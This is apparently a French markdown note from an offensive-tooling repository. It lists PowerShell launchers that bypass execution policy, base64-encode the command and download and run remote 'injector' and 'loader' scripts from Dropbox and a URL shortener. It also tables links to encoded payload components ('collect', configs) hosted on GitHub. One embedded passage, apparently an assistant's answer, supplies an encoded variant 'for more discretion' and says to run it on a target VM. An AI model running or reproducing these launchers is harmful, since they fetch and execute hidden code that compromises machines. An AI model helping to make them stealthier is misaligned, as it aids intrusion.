
## Lanceurs 

**1) Commande initiale**

    ```
    powershell.exe -ep bypass -EncodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (iwr -UseBasicParsing 'https://www.dropbox.com/scl/fi/pnnw05drhtup1r6zu8v5a/injector.ps1?rlkey=h7m4qdlub5ph5gdhghxrgsqg4&st=zcnyosfp&dl=1')")))
    ```
**2) Variante**

    ```
    powershell.exe -ep bypass -EncodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (iwr -UseBasicParsing 'https://urls.fr/bBBMfW')")))
    ```

**3) Pour le loader**

    ```
    Voici la commande PowerShell pour lancer le loader directement depuis Dropbox :

    ```powershell
    iex (iwr -UseBasicParsing 'https://www.dropbox.com/scl/fi/0w40f8y72fhvfgmnwja83/loader.ps1?rlkey=fl5hjyp9ia0a9v228734vrnck&st=dgcebmxk&dl=1')
    ```

    Et en version encodée pour plus de discrétion :

    ```powershell
    powershell.exe -ep bypass -EncodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (iwr -UseBasicParsing 'https://www.dropbox.com/scl/fi/0w40f8y72fhvfgmnwja83/loader.ps1?rlkey=fl5hjyp9ia0a9v228734vrnck&st=dgcebmxk&dl=1')")))
    ```

    Tu peux utiliser l’une ou l’autre sur ta VM cible pour démarrer toute la chaîne.
    ```

## Table des liens

### collect.ps1

| Fichier | Lien raw |
|---------|------|-------------|
| [collect.m1d0b4n](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/55b009af/collect.m1d0b4n) | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/55b009af/collect.m1d0b4n) |
| [config_1.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/55b009af/config_1.txt)       | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/55b009af/config_1.txt)    |
| [config_2.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/55b009af/config_2.txt)       | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/55b009af/config_2.txt)    |
| [config_3.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/55b009af/config_3.txt)       | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/55b009af/config_3.txt)    |
| [i_theme.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/55b009af/i_theme.txt)         | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/55b009af/i_theme.txt)     |

### injector.ps1

| Fichier | Lien raw | Lien shorté |
|---------|------|-------------|
| [injector.m1d0b4n](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/35e9c79b/injector.m1d0b4n) | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/35e9c79b/injector.m1d0b4n) |
| [config_1.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/35e9c79b/config_1.txt)         | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/35e9c79b/config_1.txt)     |
| [config_2.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/35e9c79b/config_2.txt)         | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/35e9c79b/config_2.txt)     |
| [config_3.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/35e9c79b/config_3.txt)         | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/35e9c79b/config_3.txt)     |
| [i_theme.txt](https://github.com/m1d0b4n/j4g4n/blob/main/utils/enc_s/35e9c79b/i_theme.txt)           | [lien](https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/utils/enc_s/35e9c79b/i_theme.txt)      |